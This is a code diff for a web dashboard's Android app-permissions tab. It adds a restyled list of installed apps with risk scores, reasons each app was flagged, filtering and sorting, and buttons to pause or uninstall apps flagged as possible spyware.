@@ -306,6 +306,48 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 .global-search input::placeholder{color:var(--muted);font-size:11px}
 @media(max-width:720px){.global-search{width:100%;margin:4px 0 0}.global-search input{width:100%}.global-search input:focus{width:100%}}
 #globalSearchResults{position:absolute;top:100%;left:0;right:0;z-index:9999;background:var(--card);border:1px solid var(--border);border-radius:var(--radius);max-height:60vh;overflow-y:auto;display:none;box-shadow:0 8px 24px rgba(0,0,0,.5)}.header{position:relative}
+/* === Perms redesign v2 === */
+.perm-hero{display:grid;grid-template-columns:1fr;gap:8px;margin-bottom:10px}
+.perm-stat-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(108px,1fr));gap:8px}
+.perm-stat{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:10px 10px;position:relative;overflow:hidden}
+.perm-stat b{font-size:20px;font-weight:700;display:block;line-height:1}
+.perm-stat span{font-size:11px;color:var(--muted);letter-spacing:.2px}
+.perm-stat.active{border-color:var(--accent);box-shadow:0 2px 10px rgba(255,202,40,.18)}
+.perm-pill-bar{display:flex;gap:6px;flex-wrap:wrap;align-items:center;padding:6px 0}
+.perm-pill{padding:6px 12px;border-radius:999px;font-size:12px;font-weight:600;border:1px solid var(--border);background:var(--card);color:var(--muted);cursor:pointer;transition:.15s;user-select:none;display:inline-flex;align-items:center;gap:6px}
+.perm-pill.on{background:var(--accent);color:#000;border-color:var(--accent);box-shadow:0 2px 8px rgba(255,202,40,.25)}
+.perm-pill .cnt{font-size:10px;font-weight:700;padding:2px 6px;border-radius:999px;background:rgba(255,255,255,.12);min-width:18px;text-align:center}
+.perm-pill.on .cnt{background:rgba(0,0,0,.12);color:#000}
+.perm-search-wrap{position:relative;display:flex;gap:6px;align-items:center}
+.perm-search-wrap input{flex:1;padding:10px 36px 10px 12px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:10px;font-size:13px;transition:.15s}
+.perm-search-wrap input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,202,40,.12)}
+.perm-search-wrap .clear{position:absolute;right:8px;top:50%;transform:translateY(-50%);width:26px;height:26px;border-radius:50%;border:1px solid var(--border);background:var(--card);color:var(--muted);cursor:pointer;display:none;align-items:center;justify-content:center;font-size:14px}
+.perm-search-wrap.has-val .clear{display:flex}
+.perm-card{padding:10px 12px;margin-bottom:8px;border-left-width:3px;border-left-style:solid;background:var(--card);border-radius:0 var(--radius) var(--radius) 0;border-top:1px solid var(--border);border-right:1px solid var(--border);border-bottom:1px solid var(--border);transition:border-color .15s, box-shadow .15s}
+.perm-card:hover{box-shadow:0 2px 12px rgba(0,0,0,.18)}
+.perm-card-head{display:flex;gap:10px;align-items:flex-start}
+.perm-avatar{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:15px;flex-shrink:0;border:1px solid rgba(255,255,255,.06)}
+.perm-head-main{flex:1;min-width:0}
+.perm-name{font-size:14px;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.perm-pkg{font-family:monospace;font-size:11px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.perm-badges{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px}
+.perm-risk{display:flex;gap:8px;align-items:center;margin:8px 0 2px}
+.perm-risk-track{flex:1;height:6px;background:var(--border);border-radius:999px;overflow:hidden}
+.perm-risk-fill{height:100%;border-radius:999px;min-width:6px;transition:width .3s}
+.perm-why{margin-top:8px}
+.perm-why summary{font-size:12px;color:var(--muted);cursor:pointer;user-select:none}
+.perm-why summary:hover{color:var(--text)}
+.perm-actions{display:flex;gap:8px;margin-top:10px}
+.perm-btn{flex:1;padding:8px 10px;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid var(--border);transition:.15s;display:inline-flex;align-items:center;justify-content:center;gap:6px}
+.perm-btn:disabled{opacity:.6;cursor:not-allowed}
+.perm-btn.pause{background:var(--card);color:var(--accent);border-color:var(--accent)}
+.perm-btn.pause:hover:not(:disabled){background:rgba(255,202,40,.12)}
+.perm-btn.del{background:var(--danger);color:#fff;border-color:var(--danger)}
+.perm-btn.del:hover:not(:disabled){filter:brightness(1.08)}
+.perm-chip{font-size:10px;padding:2px 7px;border-radius:999px;border:1px solid var(--border);background:var(--bg);color:var(--muted);display:inline-flex;align-items:center;gap:4px}
+.perm-section-title{font-size:12px;font-weight:700;letter-spacing:.3px;display:flex;align-items:center;gap:6px;padding:8px 0 4px}
+.perm-divider{height:1px;background:var(--border);margin:6px 0}
+.perm-skel{height:78px;background:linear-gradient(90deg,var(--card) 25%,var(--border) 50%,var(--card) 75%);background-size:200px 100%;animation:shimmer 1.4s infinite;border-radius:var(--radius);border-left:3px solid var(--border)}
 </style>
 </head>
 <body>
@@ -926,7 +968,8 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </div>
 <div id="tab-permissions">
 <div id="permCriticalBanner" style="display:none;background:var(--danger);color:#fff;padding:10px 12px;border-radius:8px;margin-bottom:10px;font-size:13px;font-weight:600;align-items:center;gap:8px">⚠️ Critical Spy Potential Detected — Review Permissions</div>
-<div id="permSpyList" style="margin-bottom:12px"></div>
+<div id="permHero" class="perm-hero" style="display:none"><div class="perm-stat-row" id="permStatRow"></div><div id="permLastAction" style="font-size:12px;color:var(--muted);display:none"></div></div>
+<div id="permSpyList" style="margin-bottom:8px"></div>
 
 <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_perms">
 <label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
@@ -939,16 +982,16 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </label>
 <span id="syncToggleStatus_perms" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-  <span style="font-size:16px;font-weight:500">&#x1F512; App Permissions</span>
-  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollPermissions()">&#x1F504; Refresh</span>
+<div style="display:flex;justify-content:space-between;align-items:center;margin:8px 0 6px">
+  <span style="font-size:14px;font-weight:600;color:var(--text)">Apps on device</span>
+  <span class="chip" style="background:var(--card);color:var(--muted);border-color:var(--border);font-size:11px;cursor:pointer" onclick="pollPermissions()">&#x21BB; Refresh</span>
 </div>
-<div style="display:flex;gap:6px;margin-bottom:8px" id="permSubTabs"></div>
-<input type="text" id="permSearch" placeholder="&#x1F50D; Search app or permission..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
-<div style="display:flex;gap:6px;margin-bottom:8px" id="permChips"></div>
-<div style="font-size:12px;color:var(--muted);margin-bottom:6px" id="permSyncInfo"></div>
+<div class="perm-pill-bar" id="permSubTabs"></div>
+<div class="perm-search-wrap" id="permSearchWrap"><input type="text" id="permSearch" placeholder="&#x1F50D; Search app, package or permission..." style="flex:1;padding:10px 12px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:10px;font-size:13px" oninput="this.parentElement.classList.toggle('has-val', this.value.length>0); renderPermissions()"><button class="clear" id="permSearchClear" onclick="document.getElementById('permSearch').value='';this.parentElement.classList.remove('has-val');renderPermissions()" title="Clear">&#x2715;</button><select id="permSort" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:9px 8px;border-radius:10px;font-size:12px;min-width:132px" onchange="renderPermissions()"><option value="risk">Highest risk first</option><option value="recent">Recently installed</option><option value="name">Name A&#x2192;Z</option><option value="system">User first</option></select></div>
+<div style="display:flex;gap:6px;margin:8px 0;flex-wrap:wrap" id="permChips"></div>
+<div style="font-size:11px;color:var(--muted);margin-bottom:6px" id="permSyncInfo"></div>
 <div id="permRecent"></div>
-<div id="permList"><div class="label">No permissions data yet</div></div>
+<div id="permList"><div class="label">Loading apps&#x2026;</div></div>
 </div>
 <div id="tab-wifi">
 <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_wifi">
@@ -8292,15 +8335,25 @@ function permSensitiveLabel(name) {
   return null;
 }
 function permChip(label, key, active) {
-  return '<span class="chip" style="' + (active ? 'background:var(--accent);color:#000' : 'background:var(--card);color:var(--muted)') + ';font-size:12px;cursor:pointer;border:1px solid var(--border)" onclick="window.permFilter=\'' + key + '\';renderPermissions()">' + label + '</span>';
+  return '<span class="perm-pill' + (active ? ' on' : '') + '" onclick="window.permFilter=\'' + key + '\';renderPermissions()">' + label + '</span>';
 }
-
 function renderPermSubTabs() {
   const el = document.getElementById('permSubTabs');
   if (!el) return;
   const v = window.permView || 'perms';
-  const btn = (label, key) => '<span class="chip" style="' + (v === key ? 'background:var(--accent);color:#000' : 'background:var(--card);color:var(--muted)') + ';font-size:12px;cursor:pointer;border:1px solid var(--border)" onclick="window.permView=\'' + key + '\';renderPermissions()">' + label + '</span>';
-  el.innerHTML = btn('\u{1F512} Permissions', 'perms') + btn('\u{1F9FC} Clean system', 'clean_system') + btn('\u{1F6A9} Needs checking', 'needs_checking') + btn('\u{1F4F1} Apps (System vs User)', 'apps');
+  const counts = { perms: window.permCache ? window.permCache.length : 0, clean_system: window.permCache ? window.permCache.filter(isTrustedCleanSystem).length : 0, needs_checking: window.permCache ? window.permCache.filter(isShadyNeedsChecking).length : 0, apps: window.permCache ? window.permCache.length : 0 };
+  const btn = (label, key) => '<span class="perm-pill' + (v === key ? ' on' : '') + '" onclick="window.permView=\'' + key + '\';window.permFilter=\'all\';renderPermissions()">' + label + ' <span class="cnt">' + (counts[key]||0) + '</span></span>';
+  el.innerHTML = btn('\u{1F50D} Overview', 'perms') + btn('\u{1F9FC} Clean system', 'clean_system') + btn('\u26A0 Needs checking', 'needs_checking') + btn('\u{1F4F1} All apps', 'apps');
+}
+function renderPermHero(){
+  const hero=document.getElementById('permHero'); const row=document.getElementById('permStatRow'); const lastEl=document.getElementById('permLastAction');
+  if(!hero||!row||!window.permCache||!window.permCache.length){ if(hero) hero.style.display='none'; return; }
+  hero.style.display='grid';
+  const total=window.permCache.length, hi=window.permCache.filter(a=>['critical','high'].includes((a.classification||a.riskLevel||'').toLowerCase())).length, inv=window.permCache.filter(a=>(a.classification||'').toLowerCase()==='needs_investigation').length, tp=window.permCache.filter(a=>(a.classification||'').toLowerCase()==='trusted_privileged').length, sideload=window.permCache.filter(a=>/sideload|unknown/i.test((a.evidence||[]).join(' '))||/sideload|unknown/i.test(a.installSource||'')).length, user=window.permCache.filter(a=>!a.system).length;
+  const stat=(n,l,c)=>'<div class="perm-stat'+(c?' active':'')+'" onclick="'+(c?'window.permView=\''+c+'\';window.permFilter=\'all\';renderPermissions()':'')+'" style="'+(c?'cursor:pointer':'')+'"><b style="color:'+(c==='needs_checking'?'var(--danger)':c==='clean_system'?'var(--success)':'var(--accent)')+'">'+n+'</b><span>'+l+'</span></div>';
+  row.innerHTML = stat(total,'Total apps','apps') + stat(hi,'High / Critical','needs_checking') + stat(inv,'Needs investigation','needs_checking') + stat(tp,'Trusted system','clean_system') + stat(user,'User apps','apps') + stat(sideload,'Sideloaded','perms');
+  const r=window.spyLastResponse;
+  if(r && r.packageName){ const ok=r.success?'var(--success)':'var(--danger)'; lastEl.style.display='block'; lastEl.innerHTML='<span style="color:'+ok+'">'+(r.success?'&#x2705;':'&#x26A0;')+' Last: '+String(r.action||'').replace(/</g,'&lt;')+' '+String(r.packageName).replace(/</g,'&lt;')+' &#x2192; '+String(r.result||'').replace(/</g,'&lt;')+'</span> <span style="color:var(--muted)">'+(r.ts_ms? pktShort(r.ts_ms):'')+'</span>'; } else { lastEl.style.display='none'; }
 }
 function isTrustedCleanSystem(a){
   if(!a.system) return false;
@@ -8328,25 +8381,31 @@ function isShadyNeedsChecking(a){
   if(sideload && cls!=='trusted_privileged') return true;
   return highish || scoreHigh;
 }
+function permSortApps(apps){
+  const sort=document.getElementById('permSort')?.value||'risk';
+  if(sort==='recent') return apps.slice().sort((a,b)=>(b.firstInstallTime||0)-(a.firstInstallTime||0)||(b.riskScore||0)-(a.riskScore||0));
+  if(sort==='name') return apps.slice().sort((a,b)=> (a.appName||'').localeCompare(b.appName||''));
+  if(sort==='system') return apps.slice().sort((a,b)=> (a.system?1:0)-(b.system?1:0) || (b.riskScore||0)-(a.riskScore||0));
+  const rank=c=>{const x=(c.classification||c.riskLevel||'').toLowerCase(); if(x==='critical')return 0; if(x==='high')return 1; if(x==='needs_investigation')return 2; if(x==='medium')return 3; if(x==='low')return 4; if(x==='trusted_privileged'||x==='trusted')return 9; return 5;};
+  return apps.slice().sort((a,b)=> rank(a)-rank(b) || (b.riskScore||0)-(a.riskScore||0));
+}
 function renderCleanSystemApps(query){
   const q=(query||'').toLowerCase();
-  const matches=a=> !q || a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q) || (a.evidence||[]).some(e=>e.toLowerCase().includes(q));
+  const matches=a=> !q || a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q) || (a.evidence||[]).some(e=>e.toLowerCase().includes(q)) || (a.permissions||[]).some(p=>p.name.toLowerCase().includes(q));
   let apps = window.permCache.filter(a=> isTrustedCleanSystem(a) && matches(a));
-  apps.sort((a,b)=> (b.firstInstallTime||0)-(a.firstInstallTime||0) || (b.lastUpdateTime||0)-(a.lastUpdateTime||0));
-  let h='<div style="display:flex;gap:8px;font-size:12px;color:var(--muted);margin-bottom:4px;flex-wrap:wrap"><span>Total clean system: '+apps.length+'</span><span style="color:var(--success)">\u2022 sorted newest first by install date</span></div>';
-  if(!apps.length) return h + '<div class="label">No clean system apps match</div>';
-  // group by none — single sorted list newest top
+  apps=permSortApps(apps);
+  let h='<div style="display:flex;gap:8px;font-size:11px;color:var(--muted);margin-bottom:6px;flex-wrap:wrap"><span style="color:var(--success)">Clean system: '+apps.length+'</span><span> \u2022 verified, low risk</span></div>';
+  if(!apps.length) return h + '<div class="label" style="padding:16px 12px;text-align:center">No clean system apps match your search</div>';
   for(const app of apps){ h+=permAppCardHtml(app); }
   return h;
 }
 function renderNeedsCheckingApps(query){
   const q=(query||'').toLowerCase();
-  const matches=a=> !q || a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q) || (a.evidence||[]).some(e=>e.toLowerCase().includes(q));
+  const matches=a=> !q || a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q) || (a.evidence||[]).some(e=>e.toLowerCase().includes(q)) || (a.permissions||[]).some(p=>p.name.toLowerCase().includes(q));
   let apps = window.permCache.filter(a=> isShadyNeedsChecking(a) && matches(a));
-  // also include any trusted false but not clean? Already covered
-  apps.sort((a,b)=> (b.firstInstallTime||0)-(a.firstInstallTime||0) || (b.riskScore||0)-(a.riskScore||0));
-  let h='<div style="display:flex;gap:8px;font-size:12px;color:var(--muted);margin-bottom:4px;flex-wrap:wrap"><span style="color:var(--danger)">Needs checking: '+apps.length+'</span><span>\u2022 dubious sources / critical perms / shady</span><span style="color:var(--accent)">\u2022 newest first</span></div>';
-  if(!apps.length) return h + '<div class="label">No shady apps found \u2014 all clear</div>';
+  apps=permSortApps(apps);
+  let h='<div style="display:flex;gap:8px;font-size:11px;color:var(--muted);margin-bottom:6px;flex-wrap:wrap"><span style="color:var(--danger)">Needs checking: '+apps.length+'</span><span>\u2022 sideload / sensitive perms / shady pkg</span></div>';
+  if(!apps.length) return h + '<div style="padding:16px 12px;text-align:center;color:var(--success);background:var(--card);border:1px solid var(--success);border-radius:var(--radius)">\u2705 No shady apps \u2014 all clear</div>';
   for(const app of apps){ h+=permAppCardHtml(app); }
   return h;
 }
@@ -8376,22 +8435,24 @@ function trustChip(t){
   return '<span class="chip" style="font-size:9px;padding:1px 6px;background:var(--card);color:var(--muted);border-color:var(--border)">'+x+'</span>';
 }
 function evidenceHtml(evid){
-  if(!evid||!evid.length) return '<div style="font-size:11px;color:var(--muted);margin-top:4px">No suspicious indicators</div>';
-  let h='<div style="margin-top:6px">';
+  if(!evid||!evid.length) return '';
+  let h='<details class="perm-why"><summary>Why flagged \u00B7 '+evid.length+'</summary><div style="margin-top:6px">';
   for(const e of evid){
-    const low=e.toLowerCase();
     const isTrust=e.startsWith('Verified')||e.startsWith('Expected')||e.startsWith('Installed from')||e.startsWith('Preinstalled');
-    const icon=isTrust?'\u2713':'\u26A0';
+    const icon=isTrust?'\u2713':'\u2022';
     const col=isTrust?'var(--success)':'var(--muted)';
-    h+='<div style="font-size:11px;color:'+col+';padding:1px 0">'+icon+' '+e.replace(/</g,'&lt;')+'</div>';
+    h+='<div style="font-size:11px;color:'+col+';padding:2px 0">'+icon+' '+String(e).replace(/</g,'&lt;')+'</div>';
   }
-  h+='</div>';
+  h+='</div></details>';
   return h;
 }
+function escPkg(pkg){ return encodeURIComponent(pkg||''); }
 function appActionRow(pkg,isSystem){
-  const esc=pkg.replace(/'/g,"\\'").replace(/\"/g,'&quot;');
-  const sysNote=isSystem?' title="System app — uninstall may be blocked by Android, force-stop still works"' : '';
-  return '<div style="display:flex;gap:6px;margin-top:8px"><button onclick="pauseSpyApp(\''+esc+'\')" style="flex:1;padding:6px 8px;background:var(--accent);color:#000;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer">\u23F8 Pause</button><button onclick="deleteSpyApp(\''+esc+'\')"'+sysNote+' style="flex:1;padding:6px 8px;background:var(--danger);color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer">\uD83D\uDDD1 Delete</button></div>';
+  const enc=escPkg(pkg);
+  const pendingKey=window.permPending && window.permPending.pkg===pkg;
+  const dis=pendingKey?' disabled':''; const spinner=pendingKey?'<span class="spinner" style="width:10px;height:10px;border:2px solid currentColor;border-top-color:transparent;border-radius:50%;display:inline-block;animation:appsSpin .7s linear infinite"></span>':'';
+  const sysNote=isSystem?' title="System app — uninstall blocked by Android, Pause still stops it"':'';
+  return '<div class="perm-actions"><button class="perm-btn pause" onclick="pauseSpyApp(decodeURIComponent(\''+enc+'\'))"'+dis+' title="Force-stop + revoke Camera/Mic/Location/SMS">'+spinner+' &#x23F8; Pause</button><button class="perm-btn del" onclick="deleteSpyApp(decodeURIComponent(\''+enc+'\'))"'+sysNote+dis+'>'+spinner+' &#x1F5D1; Delete</button></div>';
 }
 function permAppCardHtml(app){
   const score=app.riskScore||0;
@@ -8401,8 +8462,8 @@ function permAppCardHtml(app){
   const col=classificationColor(cls);
   const recently=app.firstInstallTime && (Date.now()-app.firstInstallTime)<7*86400000;
   const isPlay=/vending|play/i.test(app.installSource||'');
-  const srcBadge=app.installSource ? '<span class="chip" style="font-size:9px;padding:1px 6px;'+(isPlay?'background:var(--success);color:#000':'background:var(--danger);color:#fff')+'">'+(isPlay?'Play Store':'Sideload')+'</span>' : '';
-  const sysPill='<span class="chip" style="font-size:9px;padding:1px 6px;background:var(--card);color:var(--muted);border-color:var(--border)">'+(app.system?'System':'User')+'</span>';
+  const srcBadge=app.installSource ? '<span class="perm-chip" style="'+(isPlay?'background:rgba(63,185,80,.14);color:var(--success);border-color:var(--success)':'background:rgba(248,81,73,.14);color:var(--danger);border-color:var(--danger)')+'">'+(isPlay?'Play Store':'Sideload')+'</span>' : '';
+  const sysPill='<span class="perm-chip">'+(app.system?'System':'User')+'</span>';
   const trust=trustChip(app.trustTier);
   const pct=Math.min(100,Math.max(6,score));
   const ev=Array.isArray(app.evidence)?app.evidence:(Array.isArray(app.riskReasons)?app.riskReasons:[]);
@@ -8412,60 +8473,43 @@ function permAppCardHtml(app){
   if(last && last.packageName===app.packageName){
     const ok2=last.success?'var(--success)':'var(--danger)';
     if(last.result==='system_app_paused'){
-      inlineStatus='<div style="font-size:11px;color:var(--accent);margin-top:4px;background:rgba(255,202,40,.12);padding:6px 8px;border-radius:6px;border:1px solid rgba(255,202,40,.3)">\u26A0 This is a built-in phone app \u2014 Android never lets it be deleted. I have stopped it and removed its access to Camera, Microphone, Location and Messages. It will stay quiet until you open it again. <span style="color:var(--muted)">('+String(last.packageName).replace(/</g,'&lt;')+')</span></div>';
+      inlineStatus='<div style="font-size:11px;color:var(--accent);margin-top:8px;background:rgba(255,202,40,.12);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,202,40,.3)">&#x26A0; Built-in phone app &#x2014; Android never lets it be deleted. Stopped and revoked Camera, Mic, Location, SMS. It stays quiet until you open it again.</div>';
     } else {
-      inlineStatus='<div style="font-size:11px;color:'+ok2+';margin-top:4px">'+(last.success?'\u2705':'\u26A0')+' '+String(last.result||'').replace(/</g,'&lt;')+'</div>';
+      inlineStatus='<div style="font-size:11px;color:'+ok2+';margin-top:8px;padding:6px 8px;border-radius:8px;border:1px solid '+ok2+';background:rgba(255,255,255,.03)">'+(last.success?'&#x2705;':'&#x26A0;')+' '+String(last.result||'').replace(/</g,'&lt;')+' <span style="color:var(--muted)">'+String(last.packageName).replace(/</g,'&lt;')+'</span></div>';
     }
   }
+  const pendingNote = (window.permPending && window.permPending.pkg===app.packageName) ? '<div style="font-size:11px;color:var(--accent);margin-top:6px">&#x23F3; Working on '+window.permPending.action+'&#x2026; you will see the result here in ~30s. Please wait before tapping again.</div>' : '';
   const borderCol=cls.toLowerCase()==='trusted_privileged'?'var(--success)':recently?'var(--accent)':col;
-  let h='<div class="card" style="padding:8px 10px;margin-bottom:6px;border-left-color:'+borderCol+'">';
-  h+='<div style="display:flex;justify-content:space-between;align-items:center;gap:6px;flex-wrap:wrap"><span style="font-weight:600;color:var(--text)">'+app.appName+'</span><span style="display:flex;gap:4px;align-items:center;flex-wrap:wrap"><span class="chip" style="font-size:10px;padding:2px 6px;background:'+col+';color:'+(col==='var(--accent)'?'#000':'#fff')+';border-color:'+col+'">'+classificationLabel(cls)+'</span>'+confidenceChip(conf)+sysPill+trust+'</span></div>';
-  h+='<div style="font-size:10px;color:var(--muted)">'+app.packageName+' '+srcBadge+(recently?' <span class="chip" style="font-size:9px;background:var(--accent);color:#000">NEW</span>':'')+(installDateStr?' <span style="margin-left:6px;color:var(--muted)">installed '+installDateStr+'</span>':'')+'</div>';
-  h+='<div style="display:flex;gap:6px;align-items:center;margin:6px 0"><div style="flex:1;height:6px;background:var(--border);border-radius:3px;overflow:hidden"><div style="height:100%;width:'+pct+'%;background:'+col+';border-radius:3px"></div></div><span style="font-size:11px;color:var(--muted)">'+score+'/100 \u00B7 '+sev+'</span></div>';
+  const avatarBg=cls.toLowerCase()==='critical'?'rgba(248,81,73,.18)':cls.toLowerCase()==='high'?'rgba(255,140,66,.18)':cls.toLowerCase()==='trusted_privileged'?'rgba(63,185,80,.16)':'var(--bg)';
+  const avatarLetter=(app.appName||'?').trim().charAt(0).toUpperCase();
+  let h='<div class="perm-card" style="border-left-color:'+borderCol+'">';
+  h+='<div class="perm-card-head"><div class="perm-avatar" style="background:'+avatarBg+';color:'+col+'">'+avatarLetter+'</div><div class="perm-head-main"><div class="perm-name" title="'+String(app.appName).replace(/"/g,'&quot;')+'">'+String(app.appName).replace(/</g,'&lt;')+' '+(recently?'<span class="perm-chip" style="background:var(--accent);color:#000;border-color:var(--accent)">NEW</span>':'')+'</div><div class="perm-pkg" title="'+String(app.packageName).replace(/"/g,'&quot;')+'">'+String(app.packageName).replace(/</g,'&lt;')+'</div><div class="perm-badges"><span class="perm-chip" style="background:'+col+';color:'+(col==='var(--accent)'?'#000':'#fff')+';border-color:'+col+'">'+classificationLabel(cls)+'</span>'+confidenceChip(conf)+sysPill+trust+srcBadge+'</div></div></div>';
+  h+='<div class="perm-risk"><div class="perm-risk-track"><div class="perm-risk-fill" style="width:'+pct+'%;background:'+col+'"></div></div><span style="font-size:11px;color:var(--muted);white-space:nowrap">'+score+'/100 \u00B7 '+sev+(installDateStr?' \u00B7 '+installDateStr:'')+'</span></div>';
   h+=evidenceHtml(ev);
   h+=inlineStatus;
+  h+=pendingNote;
   h+=appActionRow(app.packageName, !!app.system);
   h+='</div>';
   return h;
 }
 function appGroupBlock(title, apps, color) {
   if (!apps.length) return '';
-  let h = '<div style="font-size:13px;color:' + color + ';font-weight:600;padding:6px 0 4px">' + title + ' \u00B7 ' + apps.length + '</div>';
-  for (const app of apps) {
-    h += permAppCardHtml(app);
-  }
+  const id='grp_'+title.replace(/\W+/g,'_')+'_'+Math.random().toString(36).slice(2,5);
+  let h = '<div class="perm-section-title" style="color:' + color + '" onclick="document.getElementById(\''+id+'\').style.display=document.getElementById(\''+id+'\').style.display===\'none\'?\'block\':\'none\'">'+ title + ' \u00B7 ' + apps.length + ' <span style="margin-left:auto;font-size:11px;color:var(--muted)">tap to collapse</span></div><div id="'+id+'">';
+  for (const app of apps) { h += permAppCardHtml(app); }
+  h+='</div>';
   return h;
 }
 
 function renderPermApps(query) {
   const q=(query||'').toLowerCase();
-  const matches=a=> !q || a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q) || (a.evidence||[]).some(e=>e.toLowerCase().includes(q));
+  const matches=a=> !q || a.appName.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q) || (a.evidence||[]).some(e=>e.toLowerCase().includes(q)) || (a.permissions||[]).some(p=>p.name.toLowerCase().includes(q));
   let apps = window.permCache.filter(matches);
-  // sort: HIGH/CRITICAL first, then TRUSTED last
-  const rank=c=>{
-    const x=(c.classification||c.riskLevel||'').toLowerCase();
-    if(x==='critical') return 0;
-    if(x==='high') return 1;
-    if(x==='needs_investigation') return 2;
-    if(x==='medium') return 3;
-    if(x==='low') return 4;
-    if(x==='trusted_privileged'||x==='trusted') return 9;
-    return 5;
-  };
-  apps.sort((a,b)=> rank(a)-rank(b) || (b.riskScore||0)-(a.riskScore||0));
+  apps=permSortApps(apps);
   const user = apps.filter(a => !a.system);
   const system = apps.filter(a => a.system);
-  const tpCount = apps.filter(a=>(a.classification||'').toLowerCase()==='trusted_privileged').length;
-  const hiCount = apps.filter(a=>['critical','high'].includes((a.classification||a.riskLevel||'').toLowerCase())).length;
-  const invCount = apps.filter(a=>(a.classification||'').toLowerCase()==='needs_investigation').length;
-  let h = '<div style="display:flex;gap:8px;font-size:12px;color:var(--muted);margin-bottom:4px;flex-wrap:wrap">' +
-    '<span>Total: ' + apps.length + '</span>' +
-    '<span style="color:var(--danger)">High/Critical: ' + hiCount + '</span>' +
-    '<span style="color:var(--accent)">Needs investigation: ' + invCount + '</span>' +
-    '<span style="color:var(--success)">Trusted system: ' + tpCount + '</span>' +
-    '<span style="color:var(--info)">User: ' + user.length + '</span>' +
-    '<span style="color:var(--muted)">System: ' + system.length + '</span></div>';
-  if(!apps.length) return h + '<div class="label">No apps match your search</div>';
+  let h = '<div style="display:flex;gap:8px;font-size:11px;color:var(--muted);margin-bottom:6px;flex-wrap:wrap"><span>Total: ' + apps.length + '</span><span style="color:var(--info)">User: ' + user.length + '</span><span style="color:var(--muted)">System: ' + system.length + '</span></div>';
+  if(!apps.length) return h + '<div class="label" style="padding:16px;text-align:center">No apps match your search</div>';
   h += appGroupBlock('User apps', user, 'var(--info)');
   h += appGroupBlock('System apps', system, 'var(--muted)');
   return h;
@@ -8569,97 +8613,78 @@ function riskChip(level){
 function renderPermSpyList(){
   const el = document.getElementById('permSpyList');
   if(!el) return '';
-  if(!window.permCache || !window.permCache.length){ el.innerHTML='<div class="label">No permissions data yet</div>'; return ''; }
+  if(!window.permCache || !window.permCache.length){ el.innerHTML=''; return ''; }
   const last = window.spyLastResponse;
+  let h='';
   if(last && last.packageName){
-    // inline handled per-card below
-  }
-  const rank = c=>{
-    const x=(c.classification||c.riskLevel||'').toLowerCase();
-    if(x==='critical') return 0;
-    if(x==='high') return 1;
-    if(x==='needs_investigation') return 2;
-    if(x==='medium') return 3;
-    if(x==='low') return 4;
-    if(x==='trusted_privileged'||x==='trusted') return 9;
-    return 5;
-  };
-  let sorted = window.permCache.slice().sort((a,b)=> rank(a)-rank(b) || (b.riskScore||0)-(a.riskScore||0));
-  const suspicious = sorted.filter(a=> ['critical','high','needs_investigation','medium'].includes((a.classification||a.riskLevel||'').toLowerCase()));
-  const trusted = sorted.filter(a=> (a.classification||'').toLowerCase()==='trusted_privileged');
-  const low = sorted.filter(a=> !suspicious.includes(a) && !trusted.includes(a));
-  let h = '';
-  if(last && last.packageName){
-    const ago = last.ts_ms ? pktShort(last.ts_ms) : '';
     const ok = last.success ? 'var(--success)' : 'var(--danger)';
     const icon = last.success ? '\u2705' : '\u26A0';
-    h += '<div class="card" style="padding:6px 8px;margin-bottom:6px;border-left:3px solid '+ok+'"><div style="font-size:12px;color:var(--text)">'+icon+' Last: '+last.action+' '+last.packageName+' \u2192 '+String(last.result||'').replace(/</g,'&lt;')+' <span style="color:var(--muted);font-size:10px">'+ago+'</span></div></div>';
+    const ago = last.ts_ms ? pktShort(last.ts_ms) : '';
+    h+='<div class="card" style="padding:8px 10px;margin-bottom:8px;border-left:3px solid '+ok+';display:flex;justify-content:space-between;gap:8px;align-items:center"><div style="font-size:12px;color:var(--text)">'+icon+' <b>'+String(last.action||'').replace(/</g,'&lt;')+'</b> '+String(last.packageName).replace(/</g,'&lt;')+' &#x2192; '+String(last.result||'').replace(/</g,'&lt;')+' <span style="color:var(--muted);font-size:11px">'+ago+'</span></div><span class="perm-chip" style="background:'+ok+';color:'+(ok==='var(--accent)'?'#000':'#fff')+';border-color:'+ok+'">'+(last.success?'Done':'Needs check')+'</span></div>';
   }
-  if(suspicious.length){
-    h += '<div style="font-size:13px;color:var(--danger);font-weight:600;padding:6px 0 4px">\u26A0 Needs Attention ('+suspicious.length+')</div>';
